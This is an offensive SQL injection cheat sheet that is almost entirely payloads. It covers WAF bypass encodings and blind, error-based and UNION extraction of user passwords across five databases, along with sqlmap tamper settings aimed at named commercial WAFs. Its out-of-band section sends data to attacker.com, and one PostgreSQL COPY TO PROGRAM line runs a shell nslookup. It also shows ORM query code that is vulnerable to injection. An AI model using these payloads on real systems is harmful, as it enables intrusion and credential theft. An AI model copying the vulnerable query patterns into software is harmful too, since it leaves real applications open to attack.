# SQL Injection: Complete Exploitation Reference

## DBMS Fingerprinting

```sql
-- MySQL
SELECT @@version
SELECT VERSION()

-- PostgreSQL
SELECT version()
SELECT current_database()

-- MSSQL
SELECT @@version
SELECT DB_NAME()

-- Oracle
SELECT banner FROM v$version
SELECT * FROM all_tables

-- SQLite
SELECT sqlite_version()
SELECT * FROM sqlite_master
```

| Feature | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---------|-------|------------|-------|--------|--------|
| Time delay | SLEEP(N) | pg_sleep(N) | WAITFOR DELAY '0:0:N' | dbms_pipe.receive_message('a',N) | randomblob(N*1000000) |
| Version | @@version | version() | @@version | v$version | sqlite_version() |
| String concat | CONCAT() / space | || | + | || | || |
| Comments | # or -- | -- | -- | -- | -- |
| Error function | EXTRACTVALUE() | CAST(x AS int) | CONVERT(int,x) | CTXSYS.DRITHSX.SN() | LIKE CPU |
| Stacked queries | Partial (PDO) | Yes | Yes | No | Yes |
| FROM required | No | No | No | Yes (FROM DUAL) | No |
| Schema table | information_schema | information_schema | sysobjects | all_tables | sqlite_master |

## WAF Bypass Techniques

### Keyword Splitting
```sql
UN/**/ION/**/SEL/**/ECT 1,2,3--
UNION%0aSELECT 1,2,3--   (newline)
UNION%09SELECT 1,2,3--   (tab)
UNION%a0SELECT 1,2,3--   (non-breaking space)
UNION(SELECT(1),(2),(3))  (no whitespace)
```

### Alternative Operators
```sql
-- When = is blocked
' OR 1 LIKE 1 --
' OR 1 BETWEEN 0 AND 2 --
' OR 1 IN (1) --
' OR 'x' IS NOT NULL --

-- When OR is blocked
' || 1=1 --  (MySQL with PIPES_AS_CONCAT off)
' | 1=1 --  (bitwise OR)
' %26%26 1=1 --  (URL encoded AND)
```

### Encoding Bypass
```sql
%2527%2520UNION%2520SELECT%25201,2,3--  (Double URL)
%55nion %53elect 1,2,3--  (URL encoded first char)
0x756e696f6e 0x73656c656374 1,2,3--  (Hex keywords - MySQL)
CHAR(85,78,73,79,78) SELECT 1,2,3--  (Char encoding of UNION)
```

### JSON-Based WAF Bypass (Team82/Claroty)
```sql
-- WAFs that don't inspect JSON SQL operators
' OR JSON_LENGTH('{}') <= 8896 UNION DISTINCTROW SELECT @@version --
' AND JSON_EXTRACT('{"a":1}','$.a') = 1 UNION SELECT @@version --
```

### Versioned MySQL Comments
```sql
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
/*!12345UnioN*//*!12345seLECT*/ 1,2,3--
UNION /*!50000DISTINCTROW*/ SELECT 1,2,3--
```

## Exploitation Techniques

### UNION-Based
```sql
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,version(),database()--
' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables--
```

### Error-Based
```sql
-- MySQL (XPATH)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--

-- PostgreSQL
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--

-- MSSQL
' AND CONVERT(int,(SELECT TOP 1 password FROM users))--
```

### Boolean-Based Blind
```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
' AND (SELECT LENGTH(password) FROM users LIMIT 1)=N--
```

### Time-Based Blind
```sql
-- MySQL
' IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

-- PostgreSQL
' CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
' IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--

-- Oracle
' CASE WHEN (SUBSTR((SELECT password FROM users WHERE rownum=1),1,1)='a') THEN dbms_pipe.receive_message('a',5) ELSE NULL END--
```

### OOB Data Exfiltration
```sql
-- MySQL (LOAD_FILE for UNC path)
' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file')--

-- PostgreSQL (COPY to program)
' COPY (SELECT password FROM users) TO PROGRAM 'nslookup $(cat /etc/hostname).attacker.com'--

-- MSSQL (xp_dirtree)
' EXEC xp_dirtree '\\\\attacker.com\\share'--
```

## Advanced Scenarios

### Second-Order SQLi
```sql
-- Payload stored in profile name
INSERT INTO users (username) VALUES (''' UNION SELECT password FROM users--');
-- Triggered later when admin views this profile
SELECT * FROM users WHERE username = ''' UNION SELECT password FROM users--';
```

### Stored Procedure Injection
```sql
-- MSSQL: exec sp_executesql with concatenated input
' EXEC sp_executesql N'SELECT * FROM users WHERE username = ''''' + @username + '''''''--

-- MySQL: PROCEDURE ANALYSE extract
' PROCEDURE ANALYSE()--
```

### ORM Injection (TypeORM, Sequelize, Prisma)
```javascript
// TypeORM vulnerable string query
const user = await getRepository(User)
  .createQueryBuilder('user')
  .where(`user.name = '${req.query.name}'`)  // SQLi
  .getOne();

// Sequelize vulnerable literal
User.findAll({
  where: literal(`name = '${req.query.name}'`)  // SQLi
});
```

### sqlmap Tamper Scripts by WAF
```bash
# Cloudflare
sqlmap -r request.txt --tamper=charencode,randomcase,between,greatest

# AWS WAF
sqlmap -r request.txt --tamper=between,hex2char,charencode

# F5 BIG-IP
sqlmap -r request.txt --tamper=randomcase,charencode,versionedmorekeywords

# Imperva
sqlmap -r request.txt --tamper=charencode,equaltolike,randomcase,space2comment

# ModSecurity
sqlmap -r request.txt --tamper=modsecurityzeroversioned,space2comment,between
```

## sqlmap Advanced Configuration

```bash
# Full power
sqlmap -r request.txt --level=5 --risk=3 --batch --threads=10 --dbms=mysql

# Blind conditions tuning
sqlmap -r request.txt --technique=BT --time-sec=2 --union-cols=5 --string="success"

# WAF detection + bypass
sqlmap -r request.txt --identify-waf --tamper=between,randomcase

# OOB exfiltration
sqlmap -r request.txt --dns-domain=attacker.com

# Cookie/header auth
sqlmap -r request.txt --cookie="session=xyz" --header="X-CSRF:token"

# Proxy for debugging
sqlmap -r request.txt --proxy=http://127.0.0.1:8080
```

## Detection Query (by DBMS)

| DBMS | Schema Enumeration |
|------|-------------------|
| MySQL | SELECT table_name FROM information_schema.tables WHERE table_schema=database() |
| PostgreSQL | SELECT table_name FROM information_schema.tables WHERE table_schema='public' |
| MSSQL | SELECT name FROM sysobjects WHERE xtype='U' |
| Oracle | SELECT table_name FROM all_tables |
| SQLite | SELECT name FROM sqlite_master WHERE type='table' |